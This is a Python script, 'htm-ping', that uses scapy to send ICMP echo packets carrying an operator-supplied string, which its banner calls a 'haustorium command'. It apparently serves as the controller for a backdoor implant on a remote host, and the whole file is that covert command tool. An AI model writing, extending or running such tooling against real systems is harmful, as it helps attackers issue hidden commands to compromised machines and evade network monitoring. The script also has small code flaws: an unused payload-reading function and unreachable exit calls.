#!/usr/bin/env python3

# TODO: receive [payload] as a final positional parameter and [host] as a common parameter
# (`-t, --target`).

import sys
import argparse

from os import geteuid
from socket import inet_aton

banner = '''\
htm-ping [options] [host]
    -h, --help            this
    -i, --iface [iface]  send ping with [iface]
    -p, --payload [str]  haustorium command to send\
'''

colorize = lambda i, s: f"\x1b[90m[\x1b[91m{i}\x1b[90m]\x1b[0m {s}"


def read_payload(filename):
    try:
        with open(filename, 'rb') as payload:
            return payload.read()

    except Exception as x:
        raise type(x)(f'Failed to read payload from {filename}')


def main():
    if len(sys.argv) < 2:
        print(banner)
        sys.exit(1)

    parser = argparse.ArgumentParser(
        usage = banner,
        add_help = False,
        description = 'Description'
    )

    parser.add_argument('host', type = str, default = '')

    parser.add_argument('-i', '--iface', type = str, default = '')
    parser.add_argument('-p', '--payload', type = str, default = '')

    args = parser.parse_args()

    if not args.host:
        raise RuntimeError('No [host]')

    if not args.payload:
        raise RuntimeError('No payload')

    try:
        inet_aton(args.host)
    except:
        raise ValueError(f'Invalid host IP: {args.host}')
        sys.exit(1)

    try:
        from scapy.all import Ether, IP, ICMP, Raw, sendp

    except Exception as x:
        raise type(x)('Scapy must be installed')

    payload = args.payload.encode() + b'\x00'

    pkt = Ether(type = 2048)  / \
        IP(dst = args.host) / ICMP(type=8) / Raw(load=payload)

    if not args.iface:
        sendp(pkt, verbose = False)
    else:
        sendp(pkt, verbose = False, iface = args.iface)


sys.dont_write_bytecode = True

if geteuid() != 0:
    print(colorize('!', 'Must be root'))
    exit(0)

try:
    main()

except Exception as x:
    print(colorize('!', str(x)))
